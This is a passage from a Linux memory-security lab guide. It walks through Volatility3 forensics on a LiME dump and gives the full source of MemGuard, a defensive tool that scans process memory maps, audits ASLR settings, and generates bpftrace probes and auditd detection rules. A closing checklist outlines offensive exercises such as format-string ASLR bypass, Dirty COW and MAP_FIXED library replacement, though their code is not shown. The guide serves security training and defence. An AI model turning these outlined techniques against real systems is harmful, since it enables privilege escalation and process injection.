if [ -f "/usr/lib/debug/boot/vmlinux-$(uname -r)" ]; then
    ~/tools/dwarf2json/dwarf2json linux \
        --elf "/usr/lib/debug/boot/vmlinux-$(uname -r)" \
        > ~/lab_domain2a/dumps/linux-$(uname -r).json
    echo "[*] Symbol table generated"
else
    echo "[*] Install debug symbols: sudo apt install linux-image-$(uname -r)-dbgsym"
fi
```

#### Step 3: Analyze the memory dump

```bash
DUMP="$HOME/lab_domain2a/dumps/memory.lime"

# List processes
vol3 -f "$DUMP" linux.pslist

# Check for hidden processes (compare pslist vs psscan)
vol3 -f "$DUMP" linux.pslist > /tmp/pslist.txt
vol3 -f "$DUMP" linux.psscan > /tmp/psscan.txt

# Verify syscall table integrity
vol3 -f "$DUMP" linux.check_syscall

# Check for hidden kernel modules
vol3 -f "$DUMP" linux.hidden_modules

# Reconstruct memory maps for a suspicious process
vol3 -f "$DUMP" linux.proc_maps --pid <SUSPICIOUS_PID>

# Dump process memory for offline analysis
vol3 -f "$DUMP" linux.proc_maps --pid <SUSPICIOUS_PID> --dump \
    --output-dir ~/lab_domain2a/dumps/proc_dump/
```

#### Step 4: Automated post-mortem VMA analysis

```python
#!/usr/bin/env python3
"""vol3_postmortem.py — analyze Volatility3 proc_maps output for artifacts.

Usage: vol3 -f dump.lime linux.proc_maps --pid 1234 -r csv | \
       python3 vol3_postmortem.py
"""
import sys
import csv

findings = []
reader = csv.DictReader(sys.stdin)

for row in reader:
    start = int(row.get("Start", "0"), 0) if row.get("Start") else 0
    end = int(row.get("End", "0"), 0) if row.get("End") else 0
    perms = row.get("Flags", "")
    path = row.get("Path", "").strip()
    size = end - start

    if "WRITE" in perms and "EXECUTE" in perms:
        findings.append(f"CRITICAL: W+X at {start:#x}-{end:#x} "
                        f"({size:#x} bytes) path='{path}'")

    if "EXECUTE" in perms and not path:
        findings.append(f"HIGH: Anonymous executable at {start:#x}-{end:#x} "
                        f"({size:#x} bytes)")

    if "WRITE" in perms and "READ" in perms and not path and size > 0x100000:
        findings.append(f"MEDIUM: Large anon RW at {start:#x}-{end:#x} "
                        f"({size/1024/1024:.1f} MB) — possible heap spray")

if findings:
    print(f"Found {len(findings)} anomalies:")
    for f in findings:
        print(f"  {f}")
else:
    print("No anomalies detected in VMA layout.")
```

**Verification:**
- [ ] LiME produces a valid memory dump
- [ ] Volatility3 can parse the dump with correct symbol table
- [ ] `linux.pslist` lists running processes
- [ ] `linux.check_syscall` shows no hooked entries (clean system)
- [ ] Post-mortem VMA analysis correctly parses CSV output

---

## PART C: FRAMEWORK DEVELOPMENT

### MemGuard: Unified Process Memory Security Framework

Build a comprehensive Python tool that combines all defensive capabilities from Part B into a single unified framework.

#### Project structure

```
memguard/
├── setup.py
├── memguard/
│   ├── __init__.py
│   ├── cli.py              # Main CLI entry point
│   ├── vma_scanner.py       # VMA anomaly detection (Exercise B1)
│   ├── aslr_audit.py        # ASLR hardening audit (Exercise B2)
│   ├── bpf_monitor.py       # bpftrace probe generator (Exercise B3)
│   ├── audit_rules.py       # auditd rule generator (Exercise B4)
│   ├── forensics.py         # Memory forensics helpers (Exercise B5)
│   └── report.py            # Report generation
```

#### `setup.py`

```python
from setuptools import setup, find_packages

setup(
    name="memguard",
    version="1.0.0",
    description="Process Memory Security Framework",
    packages=find_packages(),
    python_requires=">=3.8",
    entry_points={
        "console_scripts": [
            "memguard=memguard.cli:main",
        ],
    },
)
```

#### `memguard/__init__.py`

```python
__version__ = "1.0.0"
```

#### `memguard/cli.py`

```python
#!/usr/bin/env python3
"""MemGuard CLI — unified process memory security framework.

Subcommands:
  scan     — Scan process VMAs for anomalies
  audit    — Audit ASLR and memory hardening settings
  monitor  — Generate bpftrace probes for runtime detection
  rules    — Generate auditd rules for memory manipulation detection
  report   — Generate a comprehensive security report
"""
import argparse
import sys
import json

from memguard.vma_scanner import VMAScanner
from memguard.aslr_audit import ASLRAuditor
from memguard.bpf_monitor import BPFMonitor
from memguard.audit_rules import AuditRuleGenerator
from memguard.report import ReportGenerator


def cmd_scan(args):
    scanner = VMAScanner()
    if args.target == "all":
        results = scanner.scan_all()
    else:
        results = scanner.scan_pid(args.target)

    if args.json:
        print(json.dumps(results, indent=2, default=str))
    else:
        scanner.print_results(results)


def cmd_audit(args):
    auditor = ASLRAuditor()
    results = auditor.run()
    if args.json:
        print(json.dumps(results, indent=2))
    else:
        auditor.print_report(results)

    if args.fix:
        auditor.apply_fixes(results)


def cmd_monitor(args):
    monitor = BPFMonitor()
    if args.generate:
        monitor.generate_probes(args.output_dir)
    elif args.launch:
        monitor.launch_tmux_session()


def cmd_rules(args):
    generator = AuditRuleGenerator()
    rules = generator.generate()
    if args.install:
        generator.install(rules)
    else:
        print(rules)


def cmd_report(args):
    reporter = ReportGenerator()
    report = reporter.generate(
        pid=args.pid,
        include_audit=True,
        include_scan=True,
    )
    if args.output:
        with open(args.output, "w") as f:
            f.write(report)
        print(f"Report written to {args.output}")
    else:
        print(report)


def main():
    parser = argparse.ArgumentParser(
        prog="memguard",
        description="Process Memory Security Framework"
    )
    sub = parser.add_subparsers(dest="command")

    # scan
    p_scan = sub.add_parser("scan", help="Scan VMAs for anomalies")
    p_scan.add_argument("target", help="PID, 'self', or 'all'")
    p_scan.add_argument("--json", action="store_true")
    p_scan.set_defaults(func=cmd_scan)

    # audit
    p_audit = sub.add_parser("audit", help="Audit ASLR hardening")
    p_audit.add_argument("--json", action="store_true")
    p_audit.add_argument("--fix", action="store_true",
                         help="Apply recommended fixes (requires root)")
    p_audit.set_defaults(func=cmd_audit)

    # monitor
    p_mon = sub.add_parser("monitor", help="bpftrace probe management")
    p_mon.add_argument("--generate", action="store_true",
                       help="Generate probe files")
    p_mon.add_argument("--launch", action="store_true",
                       help="Launch tmux monitoring session")
    p_mon.add_argument("--output-dir", default="./probes")
    p_mon.set_defaults(func=cmd_monitor)

    # rules
    p_rules = sub.add_parser("rules", help="auditd rule generation")
    p_rules.add_argument("--install", action="store_true",
                         help="Install rules (requires root)")
    p_rules.set_defaults(func=cmd_rules)

    # report
    p_report = sub.add_parser("report", help="Generate security report")
    p_report.add_argument("--pid", help="Target PID for detailed scan")
    p_report.add_argument("--output", help="Output file path")
    p_report.set_defaults(func=cmd_report)

    args = parser.parse_args()
    if not args.command:
        parser.print_help()
        sys.exit(1)

    args.func(args)


if __name__ == "__main__":
    main()
```

#### `memguard/vma_scanner.py`

```python
"""VMA anomaly scanner — core detection engine."""
import os
import re
from collections import Counter
from datetime import datetime, timezone

KNOWN_JIT = frozenset({
    "java", "node", "python3", "chrome", "firefox",
    "qemu-system-x86_64", "luajit", "dotnet", "mono",
    "chromium-browse", "chromium", "code", "electron",
})

KNOWN_ANON_EXEC = frozenset({"[vdso]", "[vsyscall]"})


class VMAScanner:
    def parse_maps(self, pid):
        vmas = []
        try:
            with open(f"/proc/{pid}/maps") as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    parts = line.split(None, 5)
                    if len(parts) < 5:
                        continue
                    s, e = (int(x, 16) for x in parts[0].split("-"))
                    vmas.append({
                        "start": s, "end": e, "size": e - s,
                        "perms": parts[1],
                        "offset": parts[2],
                        "dev": parts[3],
                        "inode": int(parts[4]),
                        "name": parts[5].strip() if len(parts) > 5 else "",
                        "raw": line,
                    })
        except (PermissionError, FileNotFoundError, ProcessLookupError):
            return None
        return vmas

    def get_comm(self, pid):
        try:
            return open(f"/proc/{pid}/comm").read().strip()
        except (FileNotFoundError, PermissionError, ProcessLookupError):
            return "?"

    def scan_pid(self, pid):
        vmas = self.parse_maps(pid)
        if vmas is None:
            return {"pid": pid, "error": "not accessible", "findings": []}

        comm = self.get_comm(pid)
        is_jit = comm in KNOWN_JIT
        findings = []
        anon_rw_sizes = Counter()

        for i, vma in enumerate(vmas):
            p = vma["perms"]
            n = vma["name"]
            sz = vma["size"]
            is_anon = vma["inode"] == 0 and not n

            if "w" in p and "x" in p:
                findings.append({
                    "severity": "CRITICAL" if is_anon else "HIGH",
                    "type": "WX_MAPPING",
                    "detail": vma["raw"],
                    "mitre": "T1055",
                })

            if "x" in p and is_anon and n not in KNOWN_ANON_EXEC and not is_jit:
                findings.append({
                    "severity": "HIGH",
                    "type": "ANON_EXEC",
                    "detail": f"{vma['start']:#x} ({sz:#x} bytes)",
                    "mitre": "T1055.012",
                })

            if "r" in p and "w" in p and is_anon:
                anon_rw_sizes[sz] += 1

        for sz, count in anon_rw_sizes.items():
            if count > 50 and sz <= 0x10000:
                findings.append({
                    "severity": "MEDIUM",
                    "type": "HEAP_SPRAY",
                    "detail": f"{count} regions of {sz:#x} bytes",
                    "mitre": "T1055",
                })

        return {
            "pid": pid,
            "comm": comm,
            "vma_count": len(vmas),
            "findings": findings,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }

    def scan_all(self):
        results = []
        for entry in os.listdir("/proc"):
            if entry.isdigit():
                result = self.scan_pid(entry)
                if result.get("findings"):
                    results.append(result)
        return results

    def print_results(self, results):
        if isinstance(results, dict):
            results = [results]
        for r in results:
            if not r.get("findings"):
                continue
            print(f"\nPID {r['pid']} ({r.get('comm', '?')}) "
                  f"VMAs={r.get('vma_count', '?')}")
            for f in r["findings"]:
                print(f"  [{f['severity']}] {f['type']}: {f['detail']}")
```

#### `memguard/aslr_audit.py`

```python
"""ASLR and memory hardening auditor."""
import os
import subprocess


class ASLRAuditor:
    def _sysctl(self, param):
        try:
            with open(f"/proc/sys/{param.replace('.', '/')}") as f:
                return f.read().strip()
        except (FileNotFoundError, PermissionError):
            return None

    def _kconfig(self, option):
        try:
            uname = os.popen("uname -r").read().strip()
            with open(f"/boot/config-{uname}") as f:
                for line in f:
                    if line.startswith(f"{option}="):
                        return line.strip().split("=")[1]
        except FileNotFoundError:
            pass
        return None

    def run(self):
        checks = [
            ("ASLR Mode", "kernel.randomize_va_space", "2",
             lambda v: "PASS" if v == "2" else "FAIL"),
            ("mmap Entropy", "vm.mmap_rnd_bits", "32",
             lambda v: "PASS" if int(v or 0) >= 32
             else "WARN" if int(v or 0) >= 28 else "FAIL"),
            ("kptr_restrict", "kernel.kptr_restrict", "2",
             lambda v: "PASS" if v == "2" else "FAIL"),
            ("dmesg_restrict", "kernel.dmesg_restrict", "1",
             lambda v: "PASS" if v == "1" else "FAIL"),
            ("perf_paranoid", "kernel.perf_event_paranoid", "3",
             lambda v: "PASS" if int(v or 0) >= 3 else "FAIL"),
            ("userfaultfd", "vm.unprivileged_userfaultfd", "0",
             lambda v: "PASS" if v == "0" or v is None else "FAIL"),
            ("ptrace_scope", "kernel.yama.ptrace_scope", "2",
             lambda v: "PASS" if int(v or 0) >= 2 else "WARN"),
            ("mmap_min_addr", "vm.mmap_min_addr", "65536",
             lambda v: "PASS" if int(v or 0) >= 65536 else "FAIL"),
        ]

        results = []
        for name, param, target, check_fn in checks:
            val = self._sysctl(param)
            status = check_fn(val) if val is not None else "UNKNOWN"
            results.append({
                "check": name, "param": param,
                "current": val, "target": target,
                "status": status,
            })

        return results

    def print_report(self, results):
        pass_c = sum(1 for r in results if r["status"] == "PASS")
        total = len(results)
        print(f"\nASLR Hardening Audit: {pass_c}/{total} passed")
        for r in results:
            icon = {"PASS": "+", "FAIL": "!", "WARN": "~",
                    "UNKNOWN": "?"}.get(r["status"], " ")
            print(f"  [{icon}] {r['check']}: {r['current']} "
                  f"(target: {r['target']})")

    def apply_fixes(self, results):
        for r in results:
            if r["status"] in ("FAIL", "WARN") and r["current"] is not None:
                cmd = f"sysctl -w {r['param']}={r['target']}"
                print(f"  Applying: {cmd}")
                os.system(f"sudo {cmd}")
```

#### `memguard/bpf_monitor.py`

```python
"""bpftrace probe generator and launcher."""
import os
import subprocess

PROBES = {
    "wx_mmap": '''tracepoint:syscalls:sys_enter_mmap
/args->prot & 0x2 && args->prot & 0x4/
{
    printf("[%s] W+X mmap: pid=%d comm=%s prot=0x%x len=0x%lx\\n",
        strftime("%H:%M:%S", nsecs), pid, comm, args->prot, args->len);
}''',
    "mprotect_exec": '''tracepoint:syscalls:sys_enter_mprotect
/args->prot & 0x4/
{
    printf("[%s] mprotect +X: pid=%d comm=%s addr=0x%lx prot=0x%x\\n",
        strftime("%H:%M:%S", nsecs), pid, comm, args->addr, args->prot);
}''',
    "madvise_dontneed": '''tracepoint:syscalls:sys_enter_madvise
/args->advice == 4/
{
    @dontneed[pid, comm] = count();
}
interval:s:10
{
    print(@dontneed); clear(@dontneed);
}''',
    "userfaultfd": '''tracepoint:syscalls:sys_enter_userfaultfd
{
    printf("[%s] userfaultfd: pid=%d uid=%d comm=%s\\n",
        strftime("%H:%M:%S", nsecs), pid, uid, comm);
}''',
}


class BPFMonitor:
    def generate_probes(self, output_dir):
        os.makedirs(output_dir, exist_ok=True)
        for name, code in PROBES.items():
            path = os.path.join(output_dir, f"{name}.bt")
            with open(path, "w") as f:
                f.write(code + "\n")
            print(f"  Written: {path}")

    def launch_tmux_session(self):
        session = "memguard_monitor"
        os.system(f"tmux kill-session -t {session} 2>/dev/null || true")
        first = True
        for name in PROBES:
            path = f"./probes/{name}.bt"
            if not os.path.exists(path):
                continue
            if first:
                os.system(
                    f"tmux new-session -d -s {session} -n {name} "
                    f"'sudo bpftrace {path}'")
                first = False
            else:
                os.system(
                    f"tmux new-window -t {session} -n {name} "
                    f"'sudo bpftrace {path}'")
        print(f"Monitor session started: tmux attach -t {session}")
```

#### `memguard/audit_rules.py`

```python
"""auditd rule generator for memory manipulation detection."""
import os

RULES = """## MemGuard — Memory Manipulation Detection Rules

## W+X mmap
-a always,exit -F arch=b64 -S mmap -F a2&=0x6 -k memguard_wx_mmap

## mprotect +EXEC
-a always,exit -F arch=b64 -S mprotect -F a2&=0x4 -k memguard_mprotect_exec

## MAP_FIXED
-a always,exit -F arch=b64 -S mmap -F a3&=0x10 -k memguard_map_fixed

## userfaultfd
-a always,exit -F arch=b64 -S userfaultfd -k memguard_userfaultfd

## Cross-process memory
-a always,exit -F arch=b64 -S process_vm_readv -k memguard_xprocess_read
-a always,exit -F arch=b64 -S process_vm_writev -k memguard_xprocess_write

## MADV_DONTNEED
-a always,exit -F arch=b64 -S madvise -F a2=4 -k memguard_madvise_dontneed
"""


class AuditRuleGenerator:
    def generate(self):
        return RULES

    def install(self, rules):
        path = "/etc/audit/rules.d/51-memguard.rules"
        with open(path, "w") as f:
            f.write(rules)
        os.system("augenrules --load")
        print(f"Rules installed to {path} and loaded.")
```

#### `memguard/report.py`

```python
"""Report generator combining all modules."""
from datetime import datetime, timezone
from memguard.vma_scanner import VMAScanner
from memguard.aslr_audit import ASLRAuditor


class ReportGenerator:
    def generate(self, pid=None, include_audit=True, include_scan=True):
        lines = []
        ts = datetime.now(timezone.utc).isoformat()
        lines.append(f"# MemGuard Security Report")
        lines.append(f"Generated: {ts}\n")

        if include_audit:
            lines.append("## ASLR Hardening Audit\n")
            auditor = ASLRAuditor()
            results = auditor.run()
            pass_c = sum(1 for r in results if r["status"] == "PASS")
            lines.append(f"Score: {pass_c}/{len(results)} checks passed\n")
            for r in results:
                icon = {"PASS": "OK", "FAIL": "FAIL", "WARN": "WARN",
                        "UNKNOWN": "?"}.get(r["status"], " ")
                lines.append(f"- [{icon}] {r['check']}: "
                             f"{r['current']} (target: {r['target']})")
            lines.append("")

        if include_scan and pid:
            lines.append(f"## VMA Scan — PID {pid}\n")
            scanner = VMAScanner()
            result = scanner.scan_pid(pid)
            if result.get("findings"):
                for f in result["findings"]:
                    lines.append(f"- [{f['severity']}] {f['type']}: "
                                 f"{f['detail']}")
            else:
                lines.append("No anomalies detected.")
            lines.append("")

        return "\n".join(lines)
```

#### Build and install

```bash
cd ~/lab_domain2a/defense/memguard

# Install in development mode
pip install -e .

# Test CLI
memguard scan self
memguard audit
memguard monitor --generate --output-dir ./probes
memguard rules
memguard report --pid self --output /tmp/memguard_report.md
```

**Verification:**
- [ ] `memguard scan <pid>` detects VMA anomalies
- [ ] `memguard audit` shows ASLR hardening score
- [ ] `memguard monitor --generate` produces bpftrace probes
- [ ] `memguard rules` outputs valid auditd rules
- [ ] `memguard report` generates a combined report

---

## Lab Validation Checklist

### Part A — Offensive Exercises

| # | Exercise | Key Outcome | Verified |
|---|----------|------------|----------|
| 1 | Memory Layout Explorer | Visualize all address space regions; measure ASLR entropy (~28 bits mmap, ~22 stack, ~13 brk) | [ ] |
| 2 | Format String ASLR Bypass | Leak libc pointers via %p; compute libc base address | [ ] |
| 3 | Fork-No-Exec Brute Force | Prove fork preserves ASLR; brute-force fixed win_function address | [ ] |
| 4 | Stack Clash Analysis | Verify stack_guard_gap >= 256 pages; SIGSEGV on large alloca | [ ] |
| 5 | Dirty COW Analyzer | Demonstrate race mechanism; confirm PATCHED on modern kernels | [ ] |
| 6 | Dirty Pipe Analyzer | Demonstrate splice+pipe mechanism; confirm CAN_MERGE cleared | [ ] |
| 7 | MAP_FIXED Attack | Replace libc page; observe anonymous rwx VMA in /proc/maps | [ ] |
| 8 | Heap Shaping | Create holes via munmap; control adjacency; MADV_DONTNEED zero-fill | [ ] |

### Part B — Defensive Exercises

| # | Exercise | Key Outcome | Verified |
|---|----------|------------|----------|
| 1 | VMA Sentinel | Detect W+X, anon exec, library gaps, heap spray, stack anomalies | [ ] |
| 2 | ASLR Audit | Score all hardening settings; generate remediation commands | [ ] |
| 3 | bpftrace Probes | Real-time detection of W+X mmap, mprotect+X, MADV_DONTNEED, userfaultfd | [ ] |
| 4 | auditd + Sigma | Deploy rules; verify detection of Part A exercises | [ ] |
| 5 | Volatility3 Forensics | Acquire dump (LiME); analyze with vol3; post-mortem VMA scan | [ ] |

### Part C — Framework

| Component | Verified |
|-----------|----------|
| `memguard scan` detects anomalies | [ ] |
| `memguard audit` reports hardening score | [ ] |
| `memguard monitor` generates probes | [ ] |
| `memguard rules` produces valid auditd rules | [ ] |
| `memguard report` generates combined report | [ ] |
| Package installs via `pip install -e .` | [ ] |

### Cross-Verification

| Offensive Exercise | Defensive Detection |
|---|---|
| Exercise 2 (Format String) → | VMA Sentinel (anon exec after code injection) |
| Exercise 5 (Dirty COW) → | bpftrace MADV_DONTNEED probe + auditd rule |
| Exercise 7 (MAP_FIXED) → | VMA Sentinel (library gap) + bpftrace MAP_FIXED probe |
| Exercise 8 (Heap Shaping) → | VMA Sentinel (heap spray pattern) |

---

## References

- **Source Chapter:** Domain 2, Chapter 2A — Process Address Space and Memory Management
- **CVEs Covered:** CVE-2016-5195 (Dirty COW), CVE-2017-1000364 (Stack Clash), CVE-2022-0847 (Dirty Pipe), CVE-2021-22555 (Netfilter OOB), CVE-2023-0386 (OverlayFS), CVE-2024-1086 (nf_tables UAF)
- **MITRE ATT&CK:** T1055 (Process Injection), T1055.012 (Process Hollowing), T1059 (Command Execution), T1068 (Exploitation for Privilege Escalation), T1574.006 (DLL Side-Loading/Library Injection)
- **Kernel Documentation:** `Documentation/admin-guide/sysctl/vm.rst`, `Documentation/x86/x86_64/mm.rst`
- **Tools:** pwntools, bpftrace, Volatility3, LiME, checksec, ROPgadget
